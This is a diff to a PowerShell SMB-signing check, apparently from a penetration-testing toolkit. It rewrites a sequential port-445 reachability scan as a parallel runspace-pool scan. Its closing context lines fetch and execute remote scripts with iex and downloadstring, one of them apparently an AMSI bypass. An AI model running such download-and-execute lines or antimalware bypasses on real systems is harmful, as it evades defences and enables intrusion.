@@ -52,36 +52,56 @@ function CheckSMBSigning
   		}
 
  	}
+
+  	$Computers = $Computers | Where-Object { $_ -and $_.trim() }
 	
-	$reachable_hosts = $null
-	$Tasks = $null
-	$total = $Computers.Count
-	$count = 0
-	
-	$Tasks = $Computers | % {
-		Write-Progress -Activity "Scanning Ports" -Status "$count out of $total hosts scanned" -PercentComplete ($count / $total * 100)
-		$tcpClient = New-Object System.Net.Sockets.TcpClient
-		$asyncResult = $tcpClient.BeginConnect($_, 445, $null, $null)
-		$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
-		if($wait) {
-  			try{
-			$tcpClient.EndConnect($asyncResult)
-			$connected = $true
-			$reachable_hosts += ($_ + "`n")
-   			} catch {
-      			$connected = $false
-			}
-		} else {$connected = $false}
-  		$tcpClient.Close()
-		$count++
-	}
-	
-	Write-Progress -Activity "Checking Hosts..." -Completed
-	
-	$reachable_hosts = ($reachable_hosts | Out-String) -split "`n"
-	$reachable_hosts = $reachable_hosts.Trim()
-	$reachable_hosts = $reachable_hosts | Where-Object { $_ -ne "" }
-	$reachable_hosts = $reachable_hosts | Sort-Object -Unique
+	# Initialize the runspace pool
+        $runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
+        $runspacePool.Open()
+
+        # Define the script block outside the loop for better efficiency
+        $scriptBlock = {
+            param ($computer)
+            $tcpClient = New-Object System.Net.Sockets.TcpClient
+            $asyncResult = $tcpClient.BeginConnect($computer, 445, $null, $null)
+            $wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
+            if ($wait) {
+                try {
+                    $tcpClient.EndConnect($asyncResult)
+                    return $computer
+                } catch {}
+            }
+            $tcpClient.Close()
+            return $null
+        }
+
+        # Use a generic list for better performance when adding items
+        $runspaces = New-Object 'System.Collections.Generic.List[System.Object]'
+
+        foreach ($computer in $Computers) {
+            $powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
+            $powerShellInstance.RunspacePool = $runspacePool
+            $runspaces.Add([PSCustomObject]@{
+                Instance = $powerShellInstance
+                Status   = $powerShellInstance.BeginInvoke()
+            })
+        }
+
+        # Collect the results
+        $reachable_hosts = @()
+        foreach ($runspace in $runspaces) {
+            $result = $runspace.Instance.EndInvoke($runspace.Status)
+            if ($result) {
+                $reachable_hosts += $result
+            }
+        }
+
+        # Update the $Computers variable with the list of reachable hosts
+        $Computers = $reachable_hosts
+
+        # Close and dispose of the runspace pool for good resource management
+        $runspacePool.Close()
+        $runspacePool.Dispose()
 	
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1')
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Get-SMBSigning.ps1')
